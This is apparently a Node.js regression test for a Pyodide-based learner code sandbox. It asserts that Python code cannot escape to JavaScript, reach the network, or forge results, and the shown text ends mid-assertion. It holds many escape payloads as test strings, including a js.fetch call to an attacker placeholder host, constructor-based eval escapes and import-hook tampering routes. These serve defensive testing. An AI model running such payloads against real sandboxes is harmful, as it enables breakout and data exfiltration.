/* Security regression against a REAL Pyodide 0.26.4.

   Why this file exists
   --------------------
   scripts/test-exercise-worker.cjs drives the worker's Python half through a
   FAKE loadPyodide. That is the right way to test grading logic — it is fast
   and it is hermetic — but it cannot see anything about the runtime itself.
   Two Critical defects were invisible to it, and structurally invisible:

     * the vendor tree was missing pyodide.asm.js, so every first run died
       before a line of learner code ran (the fake never loads a file);
     * `import js` reached the JavaScript globals, so learner code could
       fetch(), eval() and postMessage() out of the sandbox (the fake has no
       js module, so there was nothing to escape to).

   Both read as "all 26 tests pass" from the fake. This file loads the real
   vendored runtime and asks the questions the fake cannot.

   What it asserts
   ---------------
     1. `import js` raises ImportError, and js.fetch / js.eval / js.postMessage
        are unreachable — by any import route, including tampering.
     2. After the boot, the worker's network globals are sealed: fetch,
        XMLHttpRequest, WebSocket and importScripts all throw.
     3. A forged postMessage (no valid nonce) is discarded by the facade.
     4. Ordinary exercises still pass every check kind, on the real runtime.

   Runtime
   -------
   Loads ~13 MB of wasm and compiles it, which takes a few seconds locally and
   a bit longer on a loaded CI machine. The mutation cases each boot their own
   interpreter, so the file costs roughly (1 + number of mutations) boots. Set
   SILS_REAL_PYODIDE=0 to skip it all, or SILS_SKIP_MUTATIONS=1 to run the
   cases without the mutation pass (useful when iterating on a case).

   Usage:  node scripts/test-exercise-sandbox-real.cjs
*/
'use strict';
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const vm = require('node:vm');
const { spawnSync } = require('node:child_process');

const ROOT = path.resolve(__dirname, '..');
const WORKER = path.join(ROOT, 'assets/exercise-worker.js');
const SANDBOX = path.join(ROOT, 'assets/exercise-sandbox.js');
const VENDOR = path.join(ROOT, 'assets/vendor/pyodide');
const VENV_PYTHON = path.join(ROOT, '.venv/Scripts/python.exe');
const PYTHON = process.env.PYTHON || (fs.existsSync(VENV_PYTHON) ? VENV_PYTHON : 'python');

/* The worker, running for real.

   The worker cannot run in node (no Worker, and importScripts has to be
   supplied), so its real source is loaded into a vm context with a scope that
   stands in for a WorkerGlobalScope. Nothing is copied out of the worker, so a
   defect in the shipped file fails here.

   Two things about that scope matter:

     * `loadPyodide` is the GENUINE vendored loader and returns a genuine
       runtime, so the seal and the escape probes run against real Pyodide.
     * the scope really does have fetch / XMLHttpRequest / WebSocket /
       importScripts on it before the worker seals them. Without a global that
       genuinely had them, the network assertions would be checking that a
       property was never there.

   `override` boots a MUTATED copy of the worker instead of the shipped one, so
   the mutation cases can ask what the suite would say if a layer were removed.
   The default reads the file, so a defect in the shipped source fails here. */
function createRealHost(override) {
  const source = override || fs.readFileSync(WORKER, 'utf8');
  let handler = null;
  const replies = [];
  const imported = [];
  let runtime = null;

  // The genuine vendored loader and a genuine runtime. Required rather than
  // reached through the scope's importScripts, because pyodide.js is a UMD
  // bundle that wants node:fs and friends; requiring it puts it in the realm
  // where those exist. The file is still the one that ships, unmodified.
  const pyodideModule = require(path.join(VENDOR, 'pyodide.js'));

  const scope = {
    addEventListener(type, listener) { if (type === 'message') handler = listener; },
    postMessage(message) { replies.push(message); },
    fetch(...args) { scope.fetchCalled = true; return globalThis.fetch(...args); },
    XMLHttpRequest: class { constructor() { scope.xhrUsed = true; } },
    WebSocket: class { constructor() { scope.wsUsed = true; } },
    EventSource: class { },
    // Recorded rather than executed: the loader is required above. The URL is
    // still asserted, because getting it wrong is how the runtime fails to
    // find its own files in a browser.
    importScripts(url) { imported.push(url); },
  };

  const context = {
    self: scope,
    importScripts: url => scope.importScripts(url),
    // Async because the real loadPyodide is: the worker awaits it, and the
    // host has to hold the resolved instance, not the pending promise.
    async loadPyodide(options) {
      const given = (options && options.indexURL) || './vendor/pyodide/';
      const indexURL = path.isAbsolute(given) ? given : path.join(VENDOR, path.sep);
      runtime = await pyodideModule.loadPyodide(Object.assign({}, options, { indexURL }));
      return runtime;
    },
    crypto: globalThis.crypto,
    console,
  };
  context.globalThis = context;
  vm.createContext(context);
  vm.runInContext(source, context, { filename: 'assets/exercise-worker.js' });

  return {
    scope,
    imported,
    get runtime() { return runtime; },
    /* Releases the interpreter. Needed for a host that ran a probe which
       deliberately broke interpreter-wide state. */
    close() { if (runtime) { try { runtime.destroy(); } catch (failure) { /* already gone */ } runtime = null; } },
    async run(request) {
      const nonce = request.nonce || 'real-nonce';
      replies.length = 0;
      await handler({ data: Object.assign({ type: 'run', nonce }, request) });
      const result = replies.find(one => one.type === 'result');
      assert.ok(result, 'the worker must answer with a result');
      assert.equal(result.nonce, nonce, 'the worker must echo the nonce it was given');
      return { result, notices: replies.filter(one => one.type === 'loading') };
    },
  };
}

/* The facade, with a Worker stand-in that routes replies through the REAL
   worker, so the nonce check is exercised against genuine worker output rather
   than a hand-written message.

   `holdResults()` is what makes the forged-message case a real test rather than
   a timing accident. See the comment on it. */
function createFacade(realHost) {
  class Worker {
    constructor() {
      this.listeners = new Map();
      this.terminated = false;
      Worker.last = this;
    }
    addEventListener(type, listener) {
      if (!this.listeners.has(type)) this.listeners.set(type, []);
      this.listeners.get(type).push(listener);
    }
    removeEventListener(type, listener) {
      this.listeners.set(type, (this.listeners.get(type) || []).filter(one => one !== listener));
    }
    async postMessage(data) {
      this.sent = data;
      // Started, NOT awaited: the run is genuinely in flight from this line on,
      // and control comes back to the test while it is still going.
      const inFlight = realHost.run(data);
      // The gate is read here, before the reply is delivered, so arming it has
      // to happen before the run is posted.
      if (Worker.gate) await Worker.gate;
      const { result, notices } = await inFlight;
      for (const notice of notices) this.emit('message', { data: notice });
      this.emit('message', { data: result });
    }
    terminate() { this.terminated = true; }
    emit(type, event) { for (const listener of (this.listeners.get(type) || [])) listener(event); }
    /* Delivers a message the worker did NOT produce — the forgery route. */
    forge(message) { this.emit('message', { data: message }); }
  }
  Worker.last = null;
  Worker.gate = null;
  const module = { exports: {} };
  const context = {
    module, exports: module.exports, Worker, setTimeout, clearTimeout,
    crypto: globalThis.crypto,
  };
  vm.createContext(context);
  vm.runInContext(fs.readFileSync(SANDBOX, 'utf8'), context, { filename: 'assets/exercise-sandbox.js' });
  return {
    api: module.exports,
    Worker,
    /* Withhold the genuine reply until the returned function is called. ARM THIS
       BEFORE posting the run.

       Why it exists: the original version of the forged-message case waited for
       a poll to observe a posted message and only then forged, but by then the
       real run had already finished, `finish()` had resolved the promise and
       removed the listeners. The forgery was landing on a settled promise, so
       the case passed with the nonce check deleted — it proved nothing.

       A node stand-in shares one thread with the worker, so it cannot give the
       test the mid-run window a browser hands for free (in a browser the main
       thread is independent and a forgery can arrive whenever the attacker
       likes). Gating the reply reproduces that window deterministically: the
       worker has started, the facade has not been answered, and the listeners
       are provably still attached. */
    holdResults() {
      let open;
      Worker.gate = new Promise(resolve => { open = resolve; });
      return () => { Worker.gate = null; open(); };
    },
  };
}

/* Runs a snippet on the real runtime and reports how it ended. */
function tryPython(runtime, code) {
  try {
    const value = runtime.runPython(code);
    return { ok: true, value: String(value === undefined ? '' : value) };
  } catch (error) {
    return { ok: false, error: String(error && error.message || error) };
  }
}

/* Invariants that must hold on an INTACT, freshly sealed session.

   These live in one place because they are the assertions most easily got
   wrong: they all have to be checked before anything has deliberately broken
   sys.meta_path, and they answer "is the bridge ABSENT", not merely "does the
   import fail". A namespace that refused to import `js` while still holding a
   live object would pass the weaker question and leak through the back door.

   NOTE on find_spec: the sealed names RAISE ImportError rather than returning
   None, because _sils_SealedImport.find_spec raises. `import js` does the same.
   That is stricter than returning None, so the assertions accept either: the
   invariant is "does not hand back a usable spec". */
const ABSENCE = [
  // The baseline the seal rebuilds from must contain no finder that can serve
  // the bridge. Asked of the FINDER rather than matched on its name, because
  // Pyodide could rename the class -- and a name match would then quietly stop
  // matching while still reporting a sealed import path.
  //
  // The previous version of this asserted `!String(list).split(', ')
  // .includes('JsFinder')`, which is ALWAYS TRUE: String(list) renders each
  // element with quotes ("['JsFinder']"), so the unquoted needle can never
  // match. The assertion passed no matter what the baseline contained. This one
  // asks the interpreter instead.
  ['no finder on sys.meta_path can serve js',
    'import sys\n'
    + 'for f in sys.meta_path:\n'
    + '    try:\n'
    + '        assert f.find_spec("js", None) is None, "a finder on the list can still resolve js"\n'
    + '    except ImportError:\n'
    + '        pass  # the seal refuses it outright, which is stricter'],
  ['and none can serve pyodide_js',
    'import sys\n'
    + 'for f in sys.meta_path:\n'
    + '    try:\n'
    + '        assert f.find_spec("pyodide_js", None) is None\n'
    + '    except ImportError:\n'
    + '        pass'],
  ["sys.modules['js'] is absent", 'import sys\nassert sys.modules.get("js") is None'],
  ["sys.modules['pyodide_js'] is absent", 'import sys\nassert sys.modules.get("pyodide_js") is None'],
  ['find_spec("js") hands back no usable spec',
    'import importlib.util as u\n'
    + 'try:\n'
    + '    assert u.find_spec("js") is None\n'
    + 'except ImportError:\n'
    + '    pass'],
];

const SEALED_ABSENT = [
  ['find_spec("pyodide.ffi")', 'import importlib.util as u\ntry:\n    assert u.find_spec("pyodide.ffi") is None\nexcept ImportError:\n    pass'],
  ['find_spec("_pyodide_core")', 'import importlib.util as u\ntry:\n    assert u.find_spec("_pyodide_core") is None\nexcept ImportError:\n    pass'],
  ['find_spec("_pyodide._core_docs")', 'import importlib.util as u\ntry:\n    assert u.find_spec("_pyodide._core_docs") is None\nexcept ImportError:\n    pass'],
  ['find_spec("pyodide.code")', 'import importlib.util as u\ntry:\n    assert u.find_spec("pyodide.code") is None\nexcept ImportError:\n    pass'],
  ['find_spec("pyodide.webloop")', 'import importlib.util as u\ntry:\n    assert u.find_spec("pyodide.webloop") is None\nexcept ImportError:\n    pass'],
  ['sys.modules has no pyodide.ffi', 'import sys\nassert "pyodide.ffi" not in sys.modules'],
  ['sys.modules has no _pyodide_core', 'import sys\nassert "_pyodide_core" not in sys.modules'],
  ['sys.modules has no _pyodide._core_docs', 'import sys\nassert "_pyodide._core_docs" not in sys.modules'],
  ['sys.modules has no pyodide.code', 'import sys\nassert "pyodide.code" not in sys.modules'],
  // `import pyodide` must keep working: the seal matches on dotted PREFIX, and
  // Pyodide's own internals live under that package.
  ['import pyodide still works', 'import pyodide\nassert pyodide.__version__'],
  ['pyodide.ffi is off the package object',
    'import pyodide\nassert not hasattr(pyodide, "ffi"), "the attribute survived the seal"'],
  ['pyodide.code is off the package object',
    'import pyodide\nassert not hasattr(pyodide, "code"), "the attribute survived the seal"'],
  ['_pyodide._core_docs is off the package object',
    'import _pyodide\nassert not hasattr(_pyodide, "_core_docs"), "the attribute survived the seal"'],
];

const CASES = [];
const caseOf = (name, fn) => CASES.push([name, fn]);

/* ---------------------------------------------------------------- probes -- */

caseOf('the vendored runtime actually boots from the repository', async host => {
  assert.ok(fs.existsSync(path.join(VENDOR, 'pyodide.asm.js')),
    'pyodide.asm.js must be vendored or nothing here can run');
  await host.run({ code: 'pass\n', checks: [] });
  assert.equal(host.runtime.version, '0.26.4');
  assert.deepEqual(host.imported, ['./vendor/pyodide/pyodide.js']);
});

caseOf('import js raises ImportError on the real runtime', async host => {
  await host.run({ code: 'pass\n', checks: [] });
  const outcome = tryPython(host.runtime, 'import js');
  assert.equal(outcome.ok, false, 'import js must not succeed');
  assert.match(outcome.error, /ImportError/,
    `expected an ImportError, got: ${String(outcome.error || '').slice(-160)}`);
});

caseOf('js.fetch, js.eval and js.postMessage are all unreachable', async host => {
  await host.run({ code: 'pass\n', checks: [] });
  for (const attempt of [
    ['js.fetch', 'import js\njs.fetch("https://attacker.example/collect")'],
    ['js.eval', 'import js\njs.eval("1+1")'],
    ['js.postMessage', 'import js\njs.postMessage({"type":"result"})'],
    ['from js import eval', 'from js import eval'],
    ['js in a function', 'def go():\n    import js\n    return js\ngo()'],
    ['importlib.import_module("js")', 'import importlib\nimportlib.import_module("js")'],
    ['__import__("js")', '__import__("js")'],
    ['pyodide_js', 'import pyodide_js'],
    ['pyodide.code.eval_js', 'from pyodide.code import eval_js'],
  ]) {
    const outcome = tryPython(host.runtime, attempt[1]);
    assert.equal(outcome.ok, false, `${attempt[0]} must not be reachable`);
  }
});

caseOf('no route to the bridge: nine meta_path routes and six import routes', async host => {
  await host.run({ code: 'pass\n', checks: [] });

  // ORDER MATTERS, and this is the whole point of the two blocks below.
  //
  // The ROUTES block destroys sys.meta_path on purpose -- several of those
  // snippets end with `sys.meta_path = []`. Anything asserted AFTER it is
  // therefore asserting about a session the ROUTES block already wrecked, and
  // the previous version of this case had exactly that bug: its sys.modules
  // and find_spec assertions sat below the routes, so they passed against a
  // gutted import system rather than against a working sealed one. A seal that
  // broke every import would have passed them.
  //
  // So the ABSENCE assertions come FIRST, against an intact session, and each
  // ROUTE gets a fresh `host.run` so no route inherits the previous one's
  // damage. Nothing here depends on the order the routes happen to run in.
  for (const [name, code] of ABSENCE) {
    const outcome = tryPython(host.runtime, code);
    assert.equal(outcome.ok, true,
      `${name} must hold on an intact sealed session: ${String(outcome.error || '').slice(-160)}`);
  }

  const ROUTES = [
    ['sys.meta_path = list(meta_path)[1:]', 'import sys\nsys.meta_path = list(sys.meta_path)[1:]\nimport js'],
    ['sys.meta_path = tuple(meta_path)', 'import sys\nsys.meta_path = tuple(sys.meta_path)\nimport js'],
    ['sys.meta_path = list(meta_path)[:]', 'import sys\nsys.meta_path = list(sys.meta_path)[:]\nimport js'],
    ['sys.meta_path.clear()', 'import sys\nsys.meta_path.clear()\nimport js'],
    ['sys.meta_path[:] = []', 'import sys\nsys.meta_path[:] = []\nimport js'],
    ['del sys.meta_path[:]', 'import sys\ndel sys.meta_path[:]\nimport js'],
    ['sys.meta_path = []', 'import sys\nsys.meta_path = []\nimport js'],
    ["sys.modules['js'] = None", 'import sys\nsys.modules["js"] = None\nimport js'],
    // Routes that reach the finder OBJECT rather than the list it sits in.
    // pyodide._state.jsfinder is the LIVE singleton; a seal that only filtered
    // sys.meta_path would hide it without removing it.
    ['append pyodide._state.jsfinder', 'import sys, pyodide._state as st\nst.jsfinder.jsproxies["js"] = "X"\nsys.meta_path.append(st.jsfinder)\nimport js'],
    ['sys.meta_path = [pyodide._state.jsfinder]', 'import sys, pyodide._state as st\nst.jsfinder.jsproxies["js"] = "X"\nsys.meta_path = [st.jsfinder]\nimport js'],
    ['insert(0, pyodide._state.jsfinder)', 'import sys, pyodide._state as st\nst.jsfinder.jsproxies["js"] = "X"\nsys.meta_path.insert(0, st.jsfinder)\nimport js'],
    ['replace the jsproxies attribute wholesale', 'import sys, pyodide._state as st\nst.jsfinder.jsproxies = {"js": "X"}\nsys.meta_path = [st.jsfinder]\nimport js'],
    ['construct a fresh JsFinder and fill it', 'import sys\nfrom _pyodide._importhook import JsFinder\nf = JsFinder()\nf.jsproxies = {"js": "X"}\nsys.meta_path.append(f)\nimport js'],
    ['refill the table, then drop the guard from the list', 'import sys, pyodide._state as st\n'
      + 'st.jsfinder.jsproxies["js"] = "X"\nst.jsfinder.jsproxies["pyodide_js"] = "X"\n'
      + 'sys.meta_path = [f for f in sys.meta_path if type(f).__name__ != "_sils_SealedImport"]\nimport js'],
    ['register_js_module then import', 'import sys\nfrom _pyodide._importhook import register_js_module, JsProxy\n'
      + 'o = object.__new__(JsProxy)\ntry:\n    register_js_module("js", o)\nexcept BaseException:\n    pass\nimport js'],
    // The import routes, all of which must fail on their own.
    ['import js', 'import js'],
    ['importlib.import_module("js")', 'import importlib\nimportlib.import_module("js")'],
    ['__import__("js")', '__import__("js")'],
    ['from js import eval', 'from js import eval'],
    ['import pyodide_js', 'import pyodide_js'],
    // Pre-seeding sys.modules does let `import js` return a value, but only a
    // value the learner already had in hand -- there is no JavaScript object
    // left to put there. So the assertion is about REACH, not about the import
    // failing: what comes back must be inert. (sys.modules['js'] = None blocks
    // outright, since a None entry halts the import.)
    ['js pre-seeded in sys.modules yields nothing usable',
      'import sys\n'
      + 'sys.modules["js"] = "SENTINEL"\n'
      + 'import js\n'
      + 'assert isinstance(js, str), "got %r" % (type(js),)\n'
      + 'assert not hasattr(js, "constructor"), "the pre-seeded value reached a JS property"\n'
      + '"inert"'],
  ];
  for (const [name, code] of ROUTES) {
    // One run per route. Each route rewrites sys.meta_path, and reusing the
    // session would make a later route's verdict depend on an earlier route's
    // damage instead of on the seal.
    await host.run({ code: 'pass\n', checks: [] });
    const outcome = tryPython(host.runtime, code);
    // Every route either raises, or prints 'blocked' / 'inert' itself. Anything
    // else means the code ran to completion without reaching `import js`.
    assert.ok(outcome.ok === false || /blocked|inert/.test(outcome.value || ''),
      `${name} must not reach the bridge, got: ${String(outcome.value || '').slice(0, 120)}`);
  }

  // And the seal must be re-armed for the NEXT run, not just the current one.
  // Learner code runs BETWEEN runs, so whatever a run did to the import system
  // is still in place when the next one starts.
  await host.run({ code: 'import sys\nsys.meta_path.clear()\n', checks: [] });
  assert.equal(tryPython(host.runtime, 'import js').ok, false,
    'the next run must still be sealed');
  // A learner who re-attached the live finder must not have bought the next run
  // anything either.
  await host.run({ code: 'import sys, pyodide._state as st\nsys.meta_path = [st.jsfinder]\n', checks: [] });
  assert.equal(tryPython(host.runtime, 'import js').ok, false,
    'a re-attached live finder must be sealed again before the next run');
});

caseOf('the proxy factory is sealed on every route into it', async host => {
  await host.run({ code: 'pass\n', checks: [] });

  // pyodide.ffi is only the public face. create_proxy also lives in the native
  // _pyodide_core module and in _pyodide._core_docs, and both are reachable
  // without any pyodide.* package involved -- which is why sealing pyodide.ffi
  // alone would have left the door open.
  for (const [name, code] of [
    ['import pyodide.ffi', 'import pyodide.ffi'],
    ['from pyodide.ffi import create_proxy', 'from pyodide.ffi import create_proxy'],
    ['create_proxy escape', 'import pyodide.ffi as f\nf.create_proxy(1).constructor.constructor("return 6*7")()'],
    ['pyodide.ffi.JsProxy', 'import pyodide.ffi.JsProxy'],
    ['pyodide.ffi as an attribute', 'import pyodide\npyodide.ffi'],
    ['import _pyodide_core', 'import _pyodide_core'],
    ['_pyodide_core.create_proxy escape', 'import _pyodide_core\n_pyodide_core.create_proxy(1).constructor.constructor("return 6*7")()'],
    ['_pyodide_core.create_once_callable', 'import _pyodide_core\n_pyodide_core.create_once_callable'],
    ['import _pyodide._core_docs', 'import _pyodide._core_docs'],
    ['_core_docs.create_proxy escape', 'from _pyodide._core_docs import create_proxy\ncreate_proxy(1).constructor.constructor("return 6*7")()'],
    ['_core_docs.to_js', 'from _pyodide._core_docs import to_js\nto_js(1)'],
    ['import pyodide.code', 'import pyodide.code'],
    ['from pyodide.code import eval_js', 'from pyodide.code import eval_js'],
    ['import pyodide.webloop', 'import pyodide.webloop'],
    ['importlib.import_module("pyodide.ffi")', 'import importlib\nimportlib.import_module("pyodide.ffi")'],
    ['__import__("pyodide.ffi")', '__import__("pyodide.ffi")'],
    ['__import__("_pyodide_core")', '__import__("_pyodide_core")'],
    ['importlib pyodide.code', 'import importlib\nimportlib.import_module("pyodide.code")'],
    // Deleting the module and re-importing must fail too, or the seal would
    // only ever hold for the first import.
    ['re-import after deleting from sys.modules', 'import sys\nsys.modules.pop("pyodide.ffi", None)\nsys.modules.pop("_pyodide_core", None)\nimport pyodide.ffi'],
    ['re-import _pyodide_core after deleting it', 'import sys\nsys.modules.pop("_pyodide_core", None)\nimport _pyodide_core'],
  ]) {
    const outcome = tryPython(host.runtime, code);
    assert.equal(outcome.ok, false, `${name} must not be reachable`);
  }

  // Same standard as for `js`: absent from the namespace, not merely
  // un-importable. A module that could not be imported but was still sitting in
  // sys.modules would hand the factory straight back.
  for (const [name, code] of SEALED_ABSENT) {
    const outcome = tryPython(host.runtime, code);
    assert.equal(outcome.ok, true,
      `${name} must report the factory as absent: ${String(outcome.error || '').slice(-160)}`);
  }

  // The hollow JsProxy a learner can build with object.__new__ is not a bridge:
  // it has no underlying JavaScript object. Asserted, because "JsProxy cannot
  // be instantiated" is exactly the kind of claim that stops being true.
  const hollow = tryPython(host.runtime,
    'from _pyodide._importhook import JsProxy\n'
    + 'o = object.__new__(JsProxy)\n'
    + 'assert not hasattr(o, "constructor"), "a hollow proxy reached a JS property"\n'
    + '"inert"');
  assert.equal(hollow.ok, true, String(hollow.error || '').slice(-160));
  assert.equal(hollow.value, 'inert');
});

caseOf('each layer of the import seal is load-bearing on its own', async host => {
  // LAYER A is the baseline filter: _sils_ORIGINAL is captured with every
  // bridge-serving finder already removed. LAYER B is the pin on the emptied
  // jsproxies table, installed on the JsFinder CLASS.
  //
  // WHICH ONE CARRIES THE LOAD, MEASURED: layer B. Deleting layer B opens the
  // two-run route below. Deleting layer A, with layer B intact, opens NO
  // measured route -- the class-level pin already makes any JsFinder resolve
  // nothing, whether or not it is on sys.meta_path. That was not true before
  // this round: the previous pin was per-instance, so a JsFinder the learner
  // constructed came into the world open.
  //
  // So layer A is defence in depth, and it is asserted as the INVARIANT it
  // actually provides -- the live singleton is not on the rebuilt list -- rather
  // than through an escape route it no longer closes. The mutation at the
  // bottom of this file re-runs this case with layer A deleted and requires it
  // to fail, which is what keeps the line honest.
  await host.run({ code: 'pass\n', checks: [] });

  // LAYER A's invariant: the finder Pyodide registered is not on the list the
  // seal rebuilds from. Asked of the interpreter by IDENTITY, not by class
  // name, because Pyodide could rename the class.
  const baseline = tryPython(host.runtime,
    'import sys, pyodide._state as st\n'
    + 'assert not any(f is st.jsfinder for f in sys.meta_path), '
    + '"the live bridge finder is back on sys.meta_path"\n'
    + 'assert not any(getattr(getattr(f, "__name__", ""), "startswith", lambda _n: False)("JsFinder") for f in sys.meta_path)\n'
    + '"clean"');
  assert.equal(baseline.ok, true, String(baseline.error || '').slice(-200));
  assert.equal(baseline.value, 'clean');

  // LAYER B's invariant, and the route it exists for: the table is pinned empty
  // and unfillable. Learner code runs BETWEEN runs, so a table dirtied in run 1
  // is still live in run 2 unless the pin is re-applied per run.
  const dirty = await host.run({
    code: 'import pyodide._state as st\nst.jsfinder.jsproxies["js"] = "SENTINEL"\n'
      + 'st.jsfinder.jsproxies["pyodide_js"] = "SENTINEL"\nprint("dirtied")\n',
    checks: [],
  });
  assert.equal(dirty.result.ok, false,
    'refilling the pinned table must itself fail -- that is the pin doing its job');
  assert.match(dirty.result.error || '', /sealed off inside the exercise sandbox/);

  const exploit = await host.run({
    code: 'import sys, pyodide._state as st\nsys.meta_path = [st.jsfinder]\nimport js\nprint("ESCAPED")\n',
    checks: [],
  });
  assert.ok(!/ESCAPED/.test(exploit.result.stdout || ''),
    'layer B must stop the two-run route: a table dirtied in run 1 was still live in run 2');
  assert.equal(exploit.result.ok, false);

  // The pinned state itself, asserted directly as well as through the routes:
  // empty, unfillable, pinned on the CLASS, and with the pre-seal dict not left
  // behind in the instance __dict__.
  const PINS = [
    ['the table is empty', 'import pyodide._state as st\nassert dict(st.jsfinder.jsproxies) == {}', true],
    ['the table refuses item assignment', 'import pyodide._state as st\nst.jsfinder.jsproxies["js"] = "X"', false],
    ['update() is refused too', 'import pyodide._state as st\nst.jsfinder.jsproxies.update({"js": "X"})', false],
    ['the attribute cannot be replaced', 'import pyodide._state as st\nst.jsfinder.jsproxies = {"js": "X"}', false],
    // A data descriptor on the class outranks the instance dict, so the pin
    // holds even against the class's own __init__.
    ['a freshly constructed JsFinder is born pinned', 'import sys\nfrom _pyodide._importhook import JsFinder\n'
      + 'f = JsFinder()\nassert dict(f.jsproxies) == {}, "a new JsFinder came into the world open"\n'
      + 'try:\n    f.jsproxies = {"js": "X"}\nexcept ImportError:\n    "sealed"', false],
    ['the pre-seal table is not left in __dict__', 'import pyodide._state as st\n'
      + 't = st.jsfinder.__dict__.get("jsproxies")\n'
      + 'assert t is None or not t, "a non-empty table is still reachable: %r" % (t,)', true],
  ];
  for (const [name, code, shouldSucceed] of PINS) {
    const outcome = tryPython(host.runtime, code);
    assert.equal(outcome.ok, shouldSucceed,
      `${name} (expected ${shouldSucceed ? 'success' : 'refusal'}): ${String(outcome.error || '').slice(-160)}`);
  }

  // The strongest form of layer B, and the reason it is a class-level pin: a
  // learner can delete the descriptor, but two things still stop them.
  //
  // First, registering a module only means something if the finder is ON
  // sys.meta_path, and layer A is what keeps it off -- so `import mine` fails
  // even after the learner deletes the pin and builds their own finder.
  //
  // This runs in its OWN worker run on purpose. `del JsFinder.jsproxies` removes
  // the descriptor for the whole interpreter, and every later case in this file
  // shares one runtime -- so doing it here would break the cases that follow.
  // That the descriptor can be deleted at all is worth stating plainly: it is a
  // plain class attribute and Python offers no way to make it private. The
  // defence is that deleting it does not get anyone a JavaScript object.
  const hollowHost = createRealHost();
  try {
    const { result } = await hollowHost.run({
      code: 'import sys\nfrom _pyodide._importhook import JsFinder, JsProxy\n'
        + 'try:\n    del JsFinder.jsproxies\nexcept BaseException:\n    pass\n'
        + 'f = JsFinder()\n'
        + 'f.register_js_module("mine", object.__new__(JsProxy))\n'
        + 'sys.meta_path = [x for x in sys.meta_path if type(x).__name__ != "_sils_SealedImport"]\n'
        + 'sys.meta_path.append(f)\n'
        + 'import mine\n'
        + 'assert not hasattr(mine, "constructor"), "a hollow proxy reached a JS property"\n'
        + 'assert mine.js_id == 0, "the hollow proxy claims a live JS handle"\n'
        + 'print("inert")\n',
      checks: [],
    });
    assert.equal(result.ok, true, result.error);
    assert.equal(result.stdout, 'inert\n');
  } finally {
    hollowHost.close();
  }
});

caseOf('the network globals are sealed after the runtime boots', async host => {
  await host.run({ code: 'pass\n', checks: [] });
  // Each of these was a working global before the seal; a scope that never had
  // them would make this case pass for the wrong reason.
  for (const name of ['fetch', 'XMLHttpRequest', 'WebSocket', 'importScripts']) {
    assert.equal(typeof host.scope[name], 'function', `${name} must still be a function`);
    assert.throws(() => host.scope[name]('https://attacker.example/x'), /disabled inside the exercise sandbox/,
      `${name} must refuse to work once the runtime is up`);
  }
  assert.equal(host.scope.fetchCalled, undefined, 'sealing fetch must stop it reaching the network');
  assert.equal(host.scope.xhrUsed, undefined, 'XMLHttpRequest must not have been constructed');
  assert.equal(host.scope.wsUsed, undefined, 'WebSocket must not have been constructed');
});

caseOf('the seal does not break ordinary Python', async host => {
  const { result } = await host.run({
    code: 'name = "Ada"\nprint(f"I am {name}")\n',
    checks: [{ kind: 'stdout_contains', value: 'I am Ada', weight: 1 }],
  });
  assert.equal(result.ok, true);
  assert.equal(result.stdout, 'I am Ada\n');
  // Every module here ships in Pyodide's own stdlib; `statistics`, `ssl` and
  // `sqlite3` are deliberately absent from it upstream, so they are not in this
  // list and must not be mistaken for seal damage.
  for (const snippet of [
    'import json; json.dumps({"a": 1})',
    'import math, re, string, random, itertools, functools, operator',
    'import collections; collections.Counter("aab").most_common()',
    'import csv, io; list(csv.reader(io.StringIO("a,b")))',
    'import textwrap; textwrap.shorten("a b c d", 5)',
    'import unicodedata; unicodedata.name("A")',
    'import datetime; datetime.datetime.now().year > 2000',
    'import fractions, decimal; str(fractions.Fraction(1, 3))',
    'import heapq, bisect, copy, pprint; bisect.bisect_left([1, 2, 3], 2)',
    'import enum, abc, dataclasses, typing; dataclasses.make_dataclass',
    'open("/tmp/sandbox-probe", "w").write("hi")',
  ]) {
    const outcome = tryPython(host.runtime, snippet);
    assert.equal(outcome.ok, true,
      `the seal broke \`${snippet}\`:\n${String(outcome.error || 'no error text')}`);
  }
});

caseOf('wiping sys.meta_path does not break the session afterwards', async host => {
  // A seal that rebuilt itself from the CURRENT meta_path would, after learner
  // code ran `sys.meta_path = []`, end up with a sealed list holding only the
  // guard: every pure-Python stdlib import would fail for the rest of the
  // session, with no way for the learner to tell why.
  await host.run({ code: 'import sys\nsys.meta_path = []\n', checks: [] });
  const outcome = tryPython(host.runtime, 'import collections; collections.Counter("ab").most_common()');
  assert.equal(outcome.ok, true,
    `the import system must recover from a wiped meta_path: ${String(outcome.error || '').split('\n').slice(-1)[0]}`);
  assert.equal(tryPython(host.runtime, 'import js').ok, false, 'and must still be sealed');
});

/* -------------------------------------------------------------- the facade -- */

caseOf('a forged postMessage is discarded while the run is still pending', async host => {
  const box = createFacade(host);
  const sandbox = box.api.create({});
  const checks = [{ kind: 'assert_python', code: 'assert False', weight: 1 }];

  // ARM THE GATE FIRST: once the run is posted the genuine reply is already on
  // its way to the facade, and the window this case is about would be gone.
  const release = box.holdResults();

  // The learner code runs to completion and its own check FAILS (assert False),
  // which is what makes a forged "everything passed" distinguishable from the
  // truth. No busy loop: the stand-in shares one thread with the real worker,
  // so learner code that burns CPU would block this process outright.
  let settled = false;
  const running = sandbox.run({ code: 'x = 1\nprint("real run")\n', checks })
    .then(value => { settled = true; return value; });

  const worker = await new Promise(resolve => {
    const tick = () => (box.Worker.last && box.Worker.last.sent ? resolve(box.Worker.last) : setTimeout(tick, 5));
    tick();
  });
  assert.ok(worker.sent, 'the facade must have posted a run');
  const nonce = worker.sent.nonce;

  // The point of the case: at this instant the run is NOT settled and the
  // facade still has its listener attached, so what happens next is a decision
  // the nonce check actually made rather than a message landing on a promise
  // that had already resolved.
  assert.equal(settled, false, 'the run must still be pending when the forgery lands');

  // Exactly the message unhardened learner code could send through
  // `js.postMessage`: a perfect result, no nonce.
  worker.forge({
    type: 'result', ok: true, stdout: 'forged', values: {},
    outcomes: checks.map(() => ({ ok: true, detail: '' })),
  });
  // ...and a near-miss with the right shape but the wrong nonce.
  worker.forge({
    type: 'result', nonce: 'deadbeef', ok: true, stdout: 'forged',
    values: {}, outcomes: checks.map(() => ({ ok: true, detail: '' })),
  });
  // ...and a replay of the worker's own `loading`, WITH the valid nonce. That is
  // the one a real attacker can get, because the nonce rides the wire. If it
  // were honoured a second time it would clear the running execution timer and
  // restart the 15-second budget, so an infinite loop would never time out.
  worker.forge({ type: 'loading', nonce });
  assert.equal(settled, false,
    'a forged result must not settle the run, and a replayed loading must not re-arm the clock');

  // Now let the genuine reply through and take the real verdict.
  release();
  const result = await running;

  assert.equal(result.outcomes.length, checks.length);
  assert.equal(result.outcomes[0].ok, false,
